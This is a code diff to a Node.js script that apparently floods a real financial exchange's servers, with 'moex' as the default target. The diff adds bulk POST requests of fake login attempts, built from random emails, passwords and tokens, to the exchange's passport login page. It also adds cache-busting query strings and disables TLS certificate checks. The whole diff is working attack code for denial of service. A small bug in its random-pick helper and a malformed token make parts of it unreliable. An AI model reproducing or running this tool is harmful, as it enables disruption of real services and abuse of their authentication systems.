@@ -1,11 +1,26 @@
-const https = require('https')
+const https = require('https');
 
 const defaultTarget = 'moex';
 const targetedService = process.env.TARGET || defaultTarget;
+const emailDomains = [
+    'mail.ru',
+    'yandex.ru',
+];
 
 const total = {};
 const current = {
     error: 0
+}
+
+function rand(maxOrList) {
+    if (Array.isArray(maxOrList)) {
+        const list = maxOrList;
+        const index = Math.floor(Math.random() * list.length - 1);
+
+        return list[index];
+    }
+
+    return Math.floor(Math.random() * maxOrList);
 }
 
 const getDurationInMilliseconds = (start) => {
@@ -56,12 +71,27 @@ async function fetchWithTimeout(resource) {
 
             const controller = new AbortController();
             const id = setTimeout(() => controller.abort(), 15000);
+            const method = resource.method || 'GET';
+
+            let body = undefined;
+            let path = `${resource.path}?putin=huilo&biba=${Math.random()}`;
+
+            if (method === 'POST') {
+                body = new URLSearchParams();
+
+                body.append('return_to', `https://passport.moex.com/?putin=huilo&biba=${Math.random()}`);
+                body.append('user[credentials]', `${Math.random()}@${rand(emailDomains)}`);
+                body.append('user[password]', `${Math.random()}`);
+                body.append('authenticity_token', `${Math.random()}/${Math.random}`);
+
+                path = resource.path;
+            }
 
             const options = {
                 hostname: resource.hostname,
-                path: `${resource.path}?putin=huilo&biba=${Math.random()}`,
+                path,
                 port: 443,
-                method: 'GET',
+                method,
                 signal: controller.signal,
                 rejectUnauthorized: false,
             }
@@ -94,7 +124,11 @@ async function fetchWithTimeout(resource) {
                 resolve(result);
             })
 
-            req.end()
+            if (method === 'POST') {
+                req.write(body.toString());
+            }
+
+            req.end();
         }, Math.random() * 1000)
 
     })
